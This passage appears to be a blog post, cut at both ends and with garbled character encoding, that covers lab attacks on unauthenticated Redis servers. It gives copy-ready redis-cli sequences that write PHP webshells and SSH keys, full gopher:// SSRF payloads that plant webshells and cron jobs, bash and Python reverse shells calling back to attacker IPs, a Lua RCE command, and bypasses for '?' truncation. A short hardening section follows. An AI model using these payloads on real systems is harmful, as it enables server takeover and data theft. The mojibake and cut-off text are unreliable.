å³å¯</li><li>è®¾ç½®ä¿å­˜æ–‡ä»¶åä¸º authorized_keys<br>config set dbfilename authorized_keys</li><li>ä¿å­˜ï¼Œæ•°æ®å†™å…¥dir ç›®å½•ä¸‹çš„ dbfilename ä¸­<br>save</li><li>ssh è¿æ¥å³å¯getshell<br>dir: The DB will be written inside this directory, with the filename specified above using the â€˜dbfilenameâ€™ configuration directive.<br>dbfilename: The filename where to dump the DB</li></ol><p>/etc/redis/redis.conf</p><p><img src="https://i.imgur.com/NQONHXo.png"></p><p>æ–¹æ³•äºŒï¼šç”Ÿæˆç¬¦åˆRESP æ ¼å¼çš„payload ï¼Œåˆ©ç”¨ ssrf(gopher åè®®) + curl æ‰“ã€‚<br>è¿™é‡Œä¸åšå¤ç°ã€‚</p><h4 id="åœºæ™¯äºŒï¼šåˆ©ç”¨redis-å†™å…¥webshell"><a href="#åœºæ™¯äºŒï¼šåˆ©ç”¨redis-å†™å…¥webshell" class="headerlink" title="åœºæ™¯äºŒï¼šåˆ©ç”¨redis å†™å…¥webshell"></a>åœºæ™¯äºŒï¼šåˆ©ç”¨redis å†™å…¥webshell</h4><p>ç›´æ¥å†™ webshell<br>192.168.118.142:6379&gt; config set dir /var/www/html<br>OK<br>192.168.118.142:6379&gt; set xxx â€œ\n\n\n<?php @eval($_POST[a];?>\n\n\nâ€<br>OK<br>192.168.118.142:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.142:6379&gt; save<br>OK<br>192.168.118.142:6379&gt;<br>ä½¿ç”¨èšå‰‘å‘ç°æ— æ³•è¿æ¥ã€‚ä¸è¿‡åœ¨é¶æœºä¸Šç¡®å®å¯ä»¥çœ‹åˆ°æ–‡ä»¶å†™å…¥äº†ã€‚</p><p>è§£å†³Apache ä¸è§£æ php ï¼šsudo apt-get install libapache2-mod-php7.2<br><img src="https://i.imgur.com/tCHcAkz.png"></p><p>ç›´æ¥è®¿é—®ï¼Œè¿”å›500ã€‚å¯ä»¥çœ‹åˆ°æ–‡ä»¶å†…å®¹æœ‰ç‚¹å¥‡æ€ªã€‚è¯•è¯•flushallå…¨éƒ¨åˆ æ‰ï¼Œé‡æ–°å†™webshell ã€‚æœç„¶ï¼ŒæˆåŠŸè¿æ¥webshellã€‚</p><p>FLUSHALLå‘½ä»¤å¯ä»¥æ¸…ç©ºä¸€ä¸ªRediså®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ•°æ®</p><p>192.168.118.142:6379&gt; flushall<br>OK<br>192.168.118.142:6379&gt; config get dir</p><ol><li>â€œdirâ€</li><li>â€œ/var/www/htmlâ€</li><li>168.118.142:6379&gt; config set dir /var/www/html/<br>OK</li><li>168.118.142:6379&gt; config get dbfilename</li><li>â€œdbfilenameâ€</li><li>â€œwebshell.phpâ€</li><li>168.118.142:6379&gt; config set dbfilename shell.php<br>OK</li><li>168.118.142:6379&gt; set webshell â€œ<?php eval($_POST[a]);?>â€œ<br>OK</li><li>168.118.142:6379&gt; save<br>OK</li><li>168.118.142:6379&gt; </li></ol><p><img src="https://i.imgur.com/qApD7Ir.png"></p><p>è¿™ä¸ªæˆåŠŸè¿ä¸Šå»ï¼Œæ˜¯www-dataæƒé™ã€‚æ‰€ä»¥æ²¡æœ‰ssh ç›´æ¥æ˜¯rootæƒé™ï¼ˆå› ä¸ºsshåˆ©ç”¨æ–¹å¼ï¼Œæ˜¯rootå¯åŠ¨redisï¼Œrootç™»å½•sshã€‚ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæ‹¿åˆ°webshell äº†ï¼Œè‡³å°‘æ¸—é€ä¹Ÿå°±æˆåŠŸäº†ä¸€åŠäº†ã€‚</p><p>ä¸è¿‡çœŸå®æ¸—é€ä¸å¯èƒ½è®©ä½ æ‰§è¡Œflushallçš„ï¼Œæ•°æ®æœ€é‡è¦ã€‚</p><p>SSRF å†™å…¥ WebShell<br>curl + ä¸‹é¢çš„payload</p><p>gopher://192.168.118.142:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br><img src="https://i.imgur.com/UDjp6GH.png"></p><h4 id="åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis-å†™å…¥crontab-åå¼¹shell"><a href="#åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis-å†™å…¥crontab-åå¼¹shell" class="headerlink" title="åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis å†™å…¥crontab åå¼¹shell"></a>åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis å†™å…¥crontab åå¼¹shell</h4><p>çœ‹ç½‘ä¸Šå·²ç»å¤ç°çš„å¸ˆå‚…çš„æ–‡ç« ï¼Œubuntu åˆ©ç”¨å®šæ—¶ä»»åŠ¡åå¼¹shell å‡ ä¹ä¸æˆï¼Œåˆ©ç”¨python åå¼¹æœ‰æ—¶å€™å¯ä»¥æˆåŠŸã€‚CentOS å¯ä»¥æˆåŠŸã€‚<br><img src="https://i.imgur.com/P5uZdwM.png"></p><p>è¿™é‡Œå°±ç”¨yulige æ–‡ç« ä¸­çš„ç‰ˆæœ¬ï¼šCentOS 6.7</p><p>åŸç†ä¹Ÿæ˜¯åˆ©ç”¨ æœªæˆæƒé€šè¿‡ CONFIG å’Œ set ç­‰å‘½ä»¤æ¥å†™å®šæ—¶ä»»åŠ¡ï¼Œç®€å•çš„æ¢äº†ä¸€ä¸‹ç‰©ç†è·¯å¾„(æ ¹æ®OSçš„ä¸åŒï¼Œå®šæ—¶ä»»åŠ¡çš„æ–‡ä»¶ç›®å½•ä¸åŒ)ã€‚ç„¶åå½“é¶æœºæ‰§è¡Œå®šæ—¶ä»»åŠ¡æ—¶ï¼Œå³å¯åå¼¹shellã€‚</p><p>CentOS å®šæ—¶ä»»åŠ¡ï¼š/var/spool/cron/<username></p><p>Ubuntu å®šæ—¶ä»»åŠ¡ï¼š/var/spool/cron/crontabs/<username></p><p>bash åå¼¹<br>Payload:</p><p>payloadç»è¿‡url ç¼–ç åï¼Œåœ¨å­˜åœ¨SSRFçš„æ¼æ´ç‚¹å³å¯åå¼¹shellã€‚</p><p>gopher://<target_ip>:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br>nc -lvp 1234</p><p>è¿œç¨‹ç™»å½•äº†redisï¼Œæ‰§è¡Œä¸€ä¸‹å³å¯ï¼Œå’Œå†™ ssh key ä¸€æ ·ã€‚crontab æœ€å°æ‰§è¡Œå•ä½ä¸º1åˆ†é’Ÿ</p><p>flushall # è°¨æ…ä½¿ç”¨ï¼ï¼ˆæœ¬åœ°æµ‹è¯•å¯ä»¥ï¼Œå®é™…æ¸—é€å¯èƒ½æ²¡è¿™ä¸ªå‘½ä»¤ï¼Œæœ‰ä¹Ÿä¸è¦ç”¨<br>set reshell â€œ\n\n* * * * * bash -i &gt; &amp; /dev/tcp/192.168.118.129/2333 0&gt;&amp;1\n\nâ€<br>config set dirr /var/spool/cron/<br>config set dbfilename root<br>save<br>nc -lvp 2333</p><p>python åå¼¹<br>\n\n * * * * * python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.118.129â€,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/shâ€,â€-iâ€]);â€™\n\n</p><h4 id="åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE"><a href="#åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE" class="headerlink" title="åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE"></a>åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE</h4><p>å½±å“ç‰ˆæœ¬ï¼šRedis 4.x/5.x (&lt;= 5.0.5)<br>æ¼æ´ç±»å‹ï¼šRCE<br>åˆ©ç”¨æ¡ä»¶ï¼šæœªæˆæƒæˆ–è€…å¼±å£ä»¤å¤–ç½‘è®¿é—®redis æœåŠ¡<br>æ”»å‡»æ€è·¯ï¼šæ¥è‡ªå‚è€ƒèµ„æ–™ã€‚</p><p>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p><p><img src="https://i.imgur.com/cLoUGX3.png"></p><p>redis 5.0:</p><p>redis 5.0 ä¸å…è®¸åœ¨è„šæœ¬ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå³ ä¸èƒ½ä½¿ç”¨CONFIG å‘½ä»¤å»è®¾ç½®æˆ–è€…è·å–æ•°æ®åº“çš„ç‰©ç†è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥çŒœæµ‹dbfilename ã€‚ PPT ä½œè€…ç»™å‡ºäº†ä¸€ç§æ”»å‡»æ€è·¯ï¼š</p><p><img src="https://i.imgur.com/SeNIJDt.jpg"></p><p>redis é€šè¿‡slaveof è®¾ç½®ä¸»ä»çŠ¶æ€ã€‚ä¸»ä»å¤åˆ¶çš„å¼€å¯ï¼Œå®Œå…¨æ˜¯åœ¨ä»èŠ‚ç‚¹å‘èµ·çš„ï¼›ä¸éœ€è¦æˆ‘ä»¬åœ¨ä¸»èŠ‚ç‚¹åšä»»ä½•äº‹æƒ…ã€‚</p><p>åœ¨Reids 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œé€šè¿‡å†™cè¯­è¨€å¹¶ç¼–è¯‘å‡º.soæ–‡ä»¶ã€‚</p><p>å¤ç°è¿‡ç¨‹<br>å¯åŠ¨ä¸€ä¸ªredis 5.0 çš„é•œåƒ<br><a href="https://www.runoob.com/docker/docker-install-redis.html">https://www.runoob.com/docker/docker-install-redis.html</a></p><p><img src="https://i.imgur.com/rUwcW6f.png"></p><p>å¯åŠ¨ä¸€ä¸ªRedis Rogue Server<br>åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œå°†æ¶æ„so æ–‡ä»¶ä¸‹è½½åˆ°.py æ–‡ä»¶åŒç›®å½•ä¸‹ã€‚</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>é»˜è®¤çš„ç«¯å£ä¸º 6379 é»˜è®¤vps ç«¯å£ä¸º21000<br><img src="https://i.imgur.com/lWGmVLx.png"></p><p>è¿™é‡Œæˆ‘æ‰“äº†å‡ æ¬¡éƒ½æ˜¯timeoutã€‚ç”¨kali ç¡®ä¿¡æ˜¯å¯ä»¥ç›´æ¥è¿œç¨‹è¿æ¥æˆ‘çš„vps çš„redisæœåŠ¡çš„ã€‚è¿™é‡Œæ˜¯ç¯å¢ƒé—®é¢˜ï¼ˆè…¾è®¯äº‘ï¼‰ï¼Œç½‘ä¸Šä¹Ÿæœ‰äº›å¸ˆå‚…æ²¡å¤ä¹ æˆåŠŸï¼Œåæ¥ç”¨vps å¤ç°æˆåŠŸäº†ã€‚</p><p>å…³äºä¸»ä»å¤åˆ¶RCEï¼ŒåŸç†æ›´é‡è¦ï¼Œå…¶å®æ‰“å°±æ˜¯ç”¨åˆ«äººçš„å·¥å…·â€¦â€¦</p><h4 id="åœºæ™¯äº”ï¼šLua-RCE"><a href="#åœºæ™¯äº”ï¼šLua-RCE" class="headerlink" title="åœºæ™¯äº”ï¼šLua RCE"></a>åœºæ™¯äº”ï¼šLua RCE</h4><p>CVE-2015-4335</p><p>å½±å“ç‰ˆæœ¬ï¼šRedis before 2.8.21 and 3.x before 3.0.2</p><p>æ¼æ´å±å®³ï¼šè¿œç¨‹æ”»å‡»è€…å¯æ‰§è¡Œevalå‘½ä»¤åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Luaå­—èŠ‚ç </p><p>Exploit: <a href="https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py">https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py</a></p><p>å°†147 è¡Œçš„ host æ”¹ä¸ºç›®æ ‡æœºå™¨ipã€‚</p><p>è·å–åå¼¹shellã€‚</p><p>eval â€œtonumber(â€˜/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.1/2333 0&gt;&amp;1â€™, 8)â€ 0</p><h4 id="åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º-RCE"><a href="#åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º-RCE" class="headerlink" title="åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º RCE"></a>åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º RCE</h4><p>CVE-2016-8339</p><p>å—å½±å“çš„ç‰ˆæœ¬ 3.2.x - 3.2.4</p><p>æ¼æ´ç±»å‹ï¼šæ•°ç»„è¶Šç•Œï¼ˆæ•°ç»„ä¸‹æ ‡è¶Šç•Œå¯¼è‡´æº¢å‡º</p><p>æ¶‰åŠäºŒè¿›åˆ¶ï¼Œå‚è€ƒï¼š<a href="https://bestwing.me/Redis-CVE-2016-8339-analysis.html">https://bestwing.me/Redis-CVE-2016-8339-analysis.html</a></p><p>POCï¼šconfig set client-output-buffer-limit â€œmaster 1094795585 1094795585 1094795585â€</p><h2 id="ç»•è¿‡-æˆªæ–­"><a href="#ç»•è¿‡-æˆªæ–­" class="headerlink" title="ç»•è¿‡ ? æˆªæ–­"></a>ç»•è¿‡ ? æˆªæ–­</h2><p>ä»¥ä¸‹å†…å®¹å‡è½¬è½½è‡ªyuligeçš„åšå®¢</p><p>è½¬ä¹‰ç»•è¿‡<br>å†™å…¥æ¶æ„ä»£ç ï¼šï¼ˆ&lt;? ç­‰ç‰¹æ®Šç¬¦å·éœ€è¦è½¬ä¹‰ï¼Œä¸ç„¶é—®å·åé¢ä¼šå¯¼è‡´æˆªæ–­æ— æ³•å†™å…¥ï¼‰<br>dict://0:6379/set:shell:â€\x3C\x3Fphp\x20echo$_GET[x]\x3B\x3F\x3Eâ€</p><p><a href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ</a><br><img src="https://i.imgur.com/je6ovIe.png"></p><h3 id="ä¸»ä»å¤åˆ¶ç»•è¿‡"><a href="#ä¸»ä»å¤åˆ¶ç»•è¿‡" class="headerlink" title="ä¸»ä»å¤åˆ¶ç»•è¿‡"></a>ä¸»ä»å¤åˆ¶ç»•è¿‡</h3><p><a href="http://yulige.top/?p=775#i-17">http://yulige.top/?p=775#i-17</a></p><p>å½“ï¼Ÿæˆªæ–­çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ä¸»ä»å¤åˆ¶çš„æ–¹æ³•å°†keyå€¼ä»ä¸»èŠ‚ç‚¹å¤åˆ¶è¿‡æ¥ã€‚ç„¶åèŠ‚ç‚¹å†æ‰§è¡Œå¤‡ä»½æ•°æ®åº“æ“ä½œå†™å…¥webshellã€‚</p><p>ä¸»èŠ‚ç‚¹</p><p>127.0.0.1:4444&gt; set shell â€œâ€<br>OK<br>èŠ‚ç‚¹</p><p>dict://0:6379/slaveof:127.0.0.1:4444<br>dict://0:6379/config:set:dir:/var/www/html<br>dict://0:6379/config:set:dbfilename:shell.php<br>dict://0:6379/save<br>dict://0:6379/slaveof:no:one<br>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æ˜¯æˆåŠŸå†™å…¥shelläº†ã€‚</p><p>å½“ç„¶äº†å¦‚æœå¯ä»¥å‡ºå¤–ç½‘ä¹Ÿå¯ä»¥ç›´æ¥ä¸»ä»å¤åˆ¶rceï¼Œè¿™ä¸€ç‚¹åœ¨å‰é¢å°±è¯´è¿‡äº†ã€‚åªè¦ç”¨pythonèµ·ä¸€ä¸ªæœåŠ¡å»æ¨¡æ‹Ÿredisçš„è¿”å›ï¼Œå¹¶ä¸”åœ¨å…¨é‡å¤åˆ¶çš„æ—¶å€™æŠŠæ•°æ®åº“æ–‡ä»¶æ›¿æ¢æˆsoæ–‡ä»¶å³å¯ã€‚</p><p>bitop å‘½ä»¤ç»•è¿‡<br>zer0pts CTF 2020 urlapp ï¼š<a href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">https://hackmd.io/@theoldmoon0602/r1mltAWHL</a><br><img src="https://i.imgur.com/VW73I1v.png"></p><p>è¯¥å‘½ä»¤å¯å°†key è¿›è¡Œä½è¿ç®—ï¼Œå–ç»“æœè¿›è¡Œä¿å­˜ã€‚</p><p>bitop å‘½ä»¤çš„è¯¦ç»†æ–‡æ¡£ï¼š<a href="https://redis.io/commands/bitop">https://redis.io/commands/bitop</a></p><p>Available since 2.6.0.</p><p>Time complexity: O(N)</p><p>Perform a bitwise operation between multiple keys (containing string values) and store the result in the destination key.</p><p>The BITOP command supports four bitwise operations: AND, OR, XOR and NOT, thus the valid forms to call the command are:</p><p>BITOP AND destkey srckey1 srckey2 srckey3 â€¦ srckeyN<br>BITOP OR destkey srckey1 srckey2 srckey3 â€¦ srckeyN<br>BITOP XOR destkey srckey1 srckey2 srckey3 â€¦ srckeyN<br>BITOP NOT destkey srckey<br>image-20200627173823931<br>image-20200627173823931</p><h3 id="setbit-å‘½ä»¤ç»•è¿‡"><a href="#setbit-å‘½ä»¤ç»•è¿‡" class="headerlink" title="setbit å‘½ä»¤ç»•è¿‡"></a>setbit å‘½ä»¤ç»•è¿‡</h3><p>æ—¢ç„¶æƒ³æ˜ç™½å…³é”®æ˜¯?æˆªæ–­çš„è¯å…¶å®æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œèƒ½æ“ä½œkeyå°±å¯ä»¥ã€‚è¿™é‡Œä¸¾å‡ºä¸€ä¸ªcommand setbit.</p><p><a href="https://www.runoob.com/redis/strings-setbit.html">https://www.runoob.com/redis/strings-setbit.html</a></p><p>Redis Setbit å‘½ä»¤ç”¨äºå¯¹ key æ‰€å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ï¼Œè®¾ç½®æˆ–æ¸…é™¤æŒ‡å®šåç§»é‡ä¸Šçš„ä½(bit)ã€‚</p><p>?çš„asciiæ˜¯63ï¼Œascii62æ˜¯&gt;ï¼ŒäºŒè¿›åˆ¶åˆ†åˆ«æ˜¯0b00011111å’Œ0b00011110ã€‚æ‰€ä»¥æŒ‰ç…§å‰é¢çš„payloadç¨å¾®æ”¹ä¸€ä¸‹å°±æ˜¯.ä½¿ç”¨setbitæ”¹åŠ¨ä¸€ä½äºŒè¿›åˆ¶å³å¯æŠŠå­—ç¬¦å˜æˆ?ï¼Œä»è€Œå¯å†™å…¥webshellã€‚</p><p>127.0.0.1:6379&gt; config set dir /var/www/html<br>OK<br>127.0.0.1:6379&gt; config set dbfilename shell.php<br>OK<br>127.0.0.1:6379&gt; set webshell â€œ&lt;&gt;php @eval($_POST[1]);&gt;&gt;â€<br>OK<br>127.0.0.1:6379&gt; setbit webshell 191 1<br>(integer) 0<br>127.0.0.1:6379&gt; setbit webshell 15 1<br>(integer) 0<br>127.0.0.1:6379&gt; save<br>OK<br>Windows ä¸‹Redis GetShell</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ redis çš„é…ç½®æ–‡ä»¶è®¾ç½®å¯†ç å‚æ•°ï¼Œè¿™æ ·å®¢æˆ·ç«¯è¿æ¥åˆ° redis æœåŠ¡å°±éœ€è¦å¯†ç éªŒè¯ï¼Œè¿™æ ·å¯ä»¥è®©ä½ çš„ redis æœåŠ¡æ›´å®‰å…¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦è®¾ç½®äº†å¯†ç éªŒè¯ï¼š</p><p>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>â€œrequirepassâ€</li><li>â€œâ€<br>é»˜è®¤æƒ…å†µä¸‹ requirepass å‚æ•°æ˜¯ç©ºçš„ï¼Œè¿™å°±æ„å‘³ç€ä½ æ— éœ€é€šè¿‡å¯†ç éªŒè¯å°±å¯ä»¥è¿æ¥åˆ° redis æœåŠ¡ã€‚</li></ol><p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ä¿®æ”¹è¯¥å‚æ•°ï¼š</p><p>127.0.0.1:6379&gt; CONFIG set requirepass â€œrunoobâ€<br>OK<br>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>â€œrequirepassâ€</li><li>â€œrunoobâ€<br>è®¾ç½®å¯†ç åï¼Œå®¢æˆ·ç«¯è¿æ¥ redis æœåŠ¡å°±éœ€è¦å¯†ç éªŒè¯ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚</li></ol><p>AUTH å‘½ä»¤åŸºæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>127.0.0.1:6379&gt; AUTH password<br>127.0.0.1:6379&gt; AUTH â€œrunoobâ€<br>OK<br>127.0.0.1:6379&gt; SET mykey â€œTest valueâ€<br>OK<br>127.0.0.1:6379&gt; GET mykey<br>â€œTest valueâ€<br>ä¿®æ”¹é»˜è®¤é…ç½®ï¼Œè®¾ç½®è®¿é—®å¯†ç ä¸ºå¼ºå¯†ç ã€‚<br>port ä¿®æ”¹redisä½¿ç”¨çš„é»˜è®¤ç«¯å£å·</p><p>bind è®¾å®šredisç›‘å¬çš„ä¸“ç”¨IP</p><p>requirepass è®¾å®šredisè¿æ¥çš„å¯†ç </p><p>rename-command CONFIG â€œâ€ã€€ ï¼ƒç¦ç”¨CONFIGå‘½ä»¤</p><p>rename-command info info2 #é‡å‘½åinfoä¸ºinfo2</p><p>è®¾ç½®é˜²ç«å¢™ç­–ç•¥ï¼Œæ·»åŠ è®¿é—®redis ç™½åå•ã€‚<br>iptables -A input -s x.x.x.x -p tcp â€“dport 6379 -j ACCEPT<br>æƒé™æœ€å°åŸåˆ™ã€‚<br>ä»¥ä½æƒé™ç”¨æˆ·å¯åŠ¨redis æœåŠ¡</p><p>ç¦ç”¨/é‡å‘½åé«˜å±å‘½ä»¤ï¼Œå¦‚config , flushall, eval<br>redis ä¸æš´éœ²å…¬ç½‘ bind 127.0.0.1 , protected-mode yes<br>ä¿®æ”¹authorized_keysæ–‡ä»¶çš„æƒé™å¯¹æ‹¥æœ‰è€…åªè¯»ï¼Œå…¶ä»–ç”¨æˆ·æ— æƒé™<br>ç›¸å…³èµ„æ–™<br><a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a> è§£å†³æ— æ³•è¿œç¨‹è¿æ¥Redis</p><p><a href="https://www.cnblogs.com/linjiqin/p/8608975.html">https://www.cnblogs.com/linjiqin/p/8608975.html</a> å¤ä¹ ä¸€ä¸‹docker</p><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a> Crontab</p><p><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t2">https://www.cnblogs.com/kismetv/p/9236731.html#t2</a> Redis ä¸»ä»å¤åˆ¶å­¦ä¹ </p><p><a href="http://yulige.top/?p=775#_RCE">http://yulige.top/?p=775#_RCE</a> ä¸€ç¯‡æ€»ç»“éå¸¸å¥½å¹¶ä¸”å…¨é¢çš„Redis å®‰å…¨åšæ–‡</p><p>[<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]">https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]</a>(<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1">https://www.k0rz3n.com/2019/07/29/å¯¹ä¸€æ¬¡</a> redis æœªæˆæƒå†™å…¥æ”»å‡»çš„åˆ†æä»¥åŠ redis 4.x RCE å­¦ä¹ /) ä¹Ÿæ˜¯ä¸€ç¯‡è¶…çº§æ£’çš„æ–‡ç« </p><p><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a> æœªæˆæƒæ”»å‡»Redis</p><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a> ä¸»ä»å¤åˆ¶æ”»å‡»æ‰‹æ³•åŸç†pdf</p><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a> ä¸»ä»å¤åˆ¶æ”»å‡»Redis</p><p><a href="https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a></p><p><a href="https://joychou.org/web/phpssrf.htmld">https://joychou.org/web/phpssrf.htmld</a> SSRF</p><p><a href="https://www.anquanke.com/post/id/181599">https://www.anquanke.com/post/id/181599</a> SSRF è®¤è¯æ”»å‡»Redis</p><p><a href="https://xz.aliyun.com/t/5665#toc-8">https://xz.aliyun.com/t/5665#toc-8</a> SSRF æ”»å‡»redis çš„æ€»ç»“</p><p><a href="https://lorexxar.cn/2016/12/03/redis-getshell/#centos">https://lorexxar.cn/2016/12/03/redis-getshell/#centos</a> redis getsell çš„ä¸€äº›æ€è€ƒ</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd</a> ç»†æ•°redis çš„å‡ ç§getshell æ–¹æ³•</p><p>ç›¸å…³å·¥å…·<br>Redis + SSRF payload ç”Ÿæˆï¼š<br><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> æ”¯æŒReverseShell å’Œ PHPShell</p><p>Redis å£ä»¤æš´ç ´<br><a href="https://github.com/evilpacket/redis-sha-crack">https://github.com/evilpacket/redis-sha-crack</a></p><p>Redis Rogue Server<br><a 